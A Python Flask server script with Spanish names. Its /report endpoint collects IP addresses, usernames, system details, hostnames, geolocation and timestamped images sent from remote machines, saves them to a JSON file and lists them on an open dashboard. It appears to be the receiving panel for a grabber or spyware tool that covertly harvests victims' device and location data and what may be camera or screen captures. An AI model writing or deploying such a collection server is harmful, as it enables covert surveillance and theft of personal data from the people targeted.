from flask import Flask, request, render_template, redirect, url_for, session, send_from_directory
from datetime import datetime
import os, json

app = Flask(__name__)
app.secret_key = "clave-super-secreta"

UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route("/report", methods=["POST"])
def report():
    ip = request.form.get("ip", "No recibido")
    username = request.form.get("username", "No recibido")
    system_info = request.form.get("system_info", "No recibido")
    hostname = request.form.get("hostname", "N/A")
    ciudad = request.form.get("ciudad", "N/A")
    region = request.form.get("region", "N/A")
    pais = request.form.get("pais", "N/A")
    loc = request.form.get("loc", "N/A")
    hora = request.form.get("hora", str(datetime.now()))

    filename = None
    image = request.files.get("image")
    if image:
        filename = datetime.now().strftime("%Y%m%d%H%M%S") + ".jpg"
        image.save(os.path.join(UPLOAD_FOLDER, filename))

    reporte = {
        "ip": ip,
        "username": username,
        "system_info": system_info,
        "hostname": hostname,
        "ciudad": ciudad,
        "region": region,
        "pais": pais,
        "loc": loc,
        "hora": hora,
        "imagen": filename
    }

    print("✅ Nuevo reporte recibido:")
    print(json.dumps(reporte, indent=2))

    if not os.path.exists("reportes.json"):
        with open("reportes.json", "w") as f:
            json.dump([], f)

    with open("reportes.json", "r") as f:
        datos = json.load(f)
    datos.insert(0, reporte)
    with open("reportes.json", "w") as f:
        json.dump(datos, f, indent=2)

    return "Reporte recibido"

@app.route("/")
def index():
    if not os.path.exists("reportes.json"):
        return "No hay reportes aún."

    with open("reportes.json", "r") as f:
        datos = json.load(f)

    reports = []
    for i, r in enumerate(datos):
        reports.append([
            i + 1,
            r.get("ip", "N/A"),
            r.get("username", "N/A"),
            r.get("system_info", "N/A"),
            {
                "hostname": r.get("hostname", "N/A"),
                "ciudad": r.get("ciudad", "N/A"),
                "region": r.get("region", "N/A"),
                "pais": r.get("pais", "N/A"),
                "loc": r.get("loc", "N/A"),
            },
            r.get("hora", "N/A"),
            r.get("imagen")
        ])

    return render_template("index.html", reports=reports)

@app.route("/uploads/<filename>")
def uploaded_file(filename):
    return send_from_directory(UPLOAD_FOLDER, filename)

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("index"))

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
